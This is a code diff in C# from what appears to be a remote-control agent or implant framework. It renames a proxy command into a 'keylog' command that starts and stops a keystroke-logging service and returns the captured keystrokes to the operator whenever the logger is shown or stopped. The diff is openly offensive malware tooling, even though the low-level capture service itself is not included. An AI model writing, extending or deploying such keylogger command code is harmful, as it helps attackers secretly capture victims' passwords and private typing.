@@ -10,49 +10,49 @@ using System.IO;
 using System.Threading;
 using Agent.Models;
 using System.Diagnostics;
-using System.Net.Sockets;
-using System.Net.NetworkInformation;
-using Agent.Helpers;
 using Agent.Service;
 using Agent.Commands.Services;
 
 namespace Agent.Commands
 {
-    public class ProxyCommand : ServiceCommand<IProxyService>
+    public class KeyLoggerCommand : ServiceCommand<IKeyLogService>
     {
-        public override string Name => "proxy";
-
+        public override string Name => "keylog";
 
         protected override void Start(AgentTask task, AgentCommandContext context, string[] args)
         {
             if (this.Service.Status == RunningService.RunningStatus.Running)
             {
-                context.Result.Result = "Proxy is already running!";
+                context.Result.Result = "Key Logger is already running!";
                 return;
             }
 
             this.Service.Start();
-            context.Result.Result = $"Proxy started";
+            context.Result.Result = $"Key Logger started";
         }
 
         protected override void Stop(AgentTask task, AgentCommandContext context, string[] args)
         {
             if (this.Service.Status != RunningService.RunningStatus.Running)
             {
-                context.Result.Result = "Proxy is not running!";
+                context.Result.Result = "Key Logger is not running!";
                 return;
             }
 
             this.Service.Stop();
-            context.Result.Result = $"Proxy stoped";
+            context.Result.Result = $"Key Logger stoped : " + Environment.NewLine;
+            context.Result.Result += this.Service.LoggedKeyStrokes;
         }
 
         protected override void Show(AgentTask task, AgentCommandContext context, string[] args)
         {
             if (this.Service.Status == RunningService.RunningStatus.Running)
-                context.Result.Result = "Proxy is running!";
+            {
+                context.Result.Result = "Key Logger is running!";
+                context.Result.Result += this.Service.LoggedKeyStrokes;
+            }
             else
-                context.Result.Result = "Proxy is stopped!";
+                context.Result.Result = "Key Logger is stopped!";
             return;
         }
     }
